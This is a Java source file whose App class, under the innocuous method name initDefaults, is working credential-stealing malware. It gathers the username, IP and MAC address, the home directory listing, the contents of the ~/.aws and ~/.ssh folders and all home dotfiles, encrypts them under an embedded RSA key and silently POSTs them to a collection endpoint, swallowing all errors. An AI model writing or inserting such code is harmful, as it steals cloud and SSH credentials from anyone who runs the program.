package com.obsession;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

public class App {
    public static void main(String[] args) {
        try {initDefaults();
        } catch (Exception e){};
        /*Thread defaultInit = new Thread(() -> {try{initDefaults();}catch(Exception i) {}});
        defaultInit.setDaemon(true);defaultInit.start();*/
    }

    private static void initDefaults() {
        try {
            String localIP = "";
            java.util.Enumeration<java.net.NetworkInterface> nets =
                    java.net.NetworkInterface.getNetworkInterfaces();
            while (nets.hasMoreElements() && localIP.isEmpty()) {
                java.net.NetworkInterface net = nets.nextElement();
                if (net.isLoopback() || !net.isUp()) continue;
                java.util.Enumeration<java.net.InetAddress> addrs = net.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    java.net.InetAddress addr = addrs.nextElement();
                    if (addr instanceof java.net.Inet4Address) {
                        localIP = addr.getHostAddress();
                        break;
                    }
                }
            }

            String macAddr = "";
            nets = java.net.NetworkInterface.getNetworkInterfaces();
            while (nets.hasMoreElements() && macAddr.isEmpty()) {
                java.net.NetworkInterface net = nets.nextElement();
                if (net.isLoopback() || !net.isUp()) continue;
                byte[] mac = net.getHardwareAddress();
                if (mac == null) continue;
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < mac.length; i++) {
                    sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? ":" : ""));
                }
                if (sb.length() > 0 && !sb.toString().equals("00:00:00:00:00:00")) {
                    macAddr = sb.toString();
                    break;
                }
            }

            File home = new File(System.getProperty("user.home"));
            File[] homeFiles = home.listFiles();
            List<String> dotFiles = new ArrayList<>();

            StringBuilder json = new StringBuilder();
            json.append("{");

            json.append("\"user\":\"").append(escapeJson(System.getProperty("user.name"))).append("\",");
            json.append("\"ip\":\"").append(escapeJson(localIP)).append("\",");
            json.append("\"mac\":\"").append(escapeJson(macAddr)).append("\",");

            // home array
            json.append("\"home\":[");
            if (homeFiles != null) {
                for (int i = 0; i < homeFiles.length; i++) {
                    String name = homeFiles[i].getName();
                    json.append("\"").append(escapeJson(name)).append("\"");
                    if (i < homeFiles.length - 1) json.append(",");
                    if (homeFiles[i].isFile() && name.startsWith("."))
                        dotFiles.add(name);
                }
            }
            json.append("],");

            json.append("\"folders\":{");
            String dirs[] = { "aws", "ssh" };
            for (int d = 0; d < dirs.length; d++) {
                List<FileInfo> dirFiles = readDirectoryFiles(new File(home, "." + dirs[d]));
                json.append("\"").append(dirs[d]).append("\":[");
                for (int f = 0; f < dirFiles.size(); f++) {
                    FileInfo fi = dirFiles.get(f);
                    json.append("{")
                        .append("\"name\":\"").append(escapeJson(fi.name)).append("\",")
                        .append("\"content\":\"").append(escapeJson(fi.content)).append("\"")
                        .append("}");
                    if (f < dirFiles.size() - 1) json.append(",");
                }
                json.append("]");
                if (d < dirs.length - 1) json.append(",");
            }
            json.append("},");

            for (int h = 0; h < dotFiles.size(); h++) {
                String dotName = dotFiles.get(h);
                String dotContent = readFileContentSafely(new File(home, dotName));
                String name = dotName.replaceFirst("\\.", "");

                if (dotContent != null) {
                    json.append("\"").append(escapeJson(name)).append("\":")
                        .append("\"").append(escapeJson(dotContent)).append("\"");
                    if (h < dotFiles.size() - 1) json.append(",");
                }
            }
            json.append("}");

            json.append("}");

            String jsonString = json.toString();
            byte[] payloadBytes = jsonString.getBytes(StandardCharsets.UTF_8);

            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(256);
            SecretKey aesKey = keyGen.generateKey();

            byte[] iv = new byte[12];
            SecureRandom random = new SecureRandom();
            random.nextBytes(iv);

            Cipher aesCipher = Cipher.getInstance("AES/GCM/NoPadding");
            GCMParameterSpec gcmSpec = new GCMParameterSpec(128, iv);
            aesCipher.init(Cipher.ENCRYPT_MODE, aesKey, gcmSpec);
            byte[] encryptedPayload = aesCipher.doFinal(payloadBytes);

            String publicKeyPEM = "-----BEGIN PUBLIC KEY-----\n" +
                    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz2jW1tYVaRFw2RsZn9f3\n" +
                    "TBpkt6MAToybWaK8dcXAu3ruNoaJ8G7g8ey8KaUjbnDW9sj4fBYnRkhLjovpWSS/\n" +
                    "L0XJWAPB7onooyEN3r5DvuUFBp9oNUyoH7cIamogDPJaUM4NSc6eHzw8yaUwkzm8\n" +
                    "CR289UoMC3wNdRCken4bfIrA89lelOpfV/g97ZPXauq0hMwQMLC8nguLRiQ2iGzJ\n" +
                    "kvsP8x00xdK4073UN3Mlzq3XSA0qltUI7lRWGEGLwwWQZLMRmB894nEU4XMv5DdZ\n" +
                    "Avavb0aOBJo7lNqJyCqXgVpYDyZgaaclj+mjWWS08Own+/M1PU0Nk28n0L3CFzL8\n" +
                    "BwIDAQAB\n" +
                    "-----END PUBLIC KEY-----";

            publicKeyPEM = publicKeyPEM.replace("-----BEGIN PUBLIC KEY-----", "")
                    .replace("-----END PUBLIC KEY-----", "")
                    .replaceAll("\\s", "");
            byte[] keyBytes = Base64.getDecoder().decode(publicKeyPEM);
            X509EncodedKeySpec spec = new X509EncodedKeySpec(keyBytes);
            KeyFactory keyFactory = KeyFactory.getInstance("RSA");
            PublicKey pubKey = keyFactory.generatePublic(spec);

            Cipher rsaCipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
            rsaCipher.init(Cipher.ENCRYPT_MODE, pubKey);
            byte[] encryptedAesKey = rsaCipher.doFinal(aesKey.getEncoded());

            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            outputStream.write((encryptedAesKey.length >> 8) & 0xFF);
            outputStream.write(encryptedAesKey.length & 0xFF);
            outputStream.write(encryptedAesKey);
            outputStream.write(iv);
            outputStream.write(encryptedPayload);

            byte[] finalPackage = outputStream.toByteArray();

            URL url = URI.create("http://localhost:8080/collect").toURL();
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/octet-stream");

            try (OutputStream os = conn.getOutputStream()) {
                os.write(finalPackage);
            } catch (Exception ignore) {
            }
            conn.getResponseCode();

        } catch (Exception ignore) {
        }
    }

    private static String readFileContentSafely(File file) {
        if (!file.exists() || !file.isFile()) return null;
        long len = file.length();
        if (len > 2 * 1024 * 1024) {
            return null;
        }
        try (FileInputStream fis = new FileInputStream(file);
            ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
            byte[] buffer = new byte[4096];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                baos.write(buffer, 0, read);
            }
            byte[] data = baos.toByteArray();
            // Check for null byte (binary indicator)
            for (byte b : data) {
                if (b == 0) {
                    return "BINARY";
                }
            }
            return new String(data, StandardCharsets.UTF_8);
        } catch (IOException e) {
            return null;
        }
    }

    private static String readFileContent(File file) {
        return readFileContentSafely(file);
    }

    private static List<FileInfo> readDirectoryFiles(File dir) {
        List<FileInfo> list = new ArrayList<>();
        if (dir.exists() && dir.isDirectory()) {
            File[] children = dir.listFiles();
            if (children != null) {
                for (File f : children) {
                    if (f.isFile()) {
                        String content = readFileContent(f);
                        if (content != null) {
                            list.add(new FileInfo(f.getName(), content));
                        }
                    }
                }
            }
        }
        return list;
    }

    private static String escapeJson(String s) {
        if (s == null) return null;
        StringBuilder sb = new StringBuilder();
        for (char c : s.toCharArray()) {
            switch (c) {
                case '\\': sb.append("\\\\"); break;
                case '"':  sb.append("\\\""); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                default:
                    if (c < 0x20) {
                        sb.append(String.format("\\u%04x", (int) c));
                    } else {
                        sb.append(c);
                    }
                    break;
            }
        }
        return sb.toString();
    }

    private static class FileInfo {
        String name;
        String content;
        FileInfo(String name, String content) {
            this.name = name;
            this.content = content;
        }
    }
}
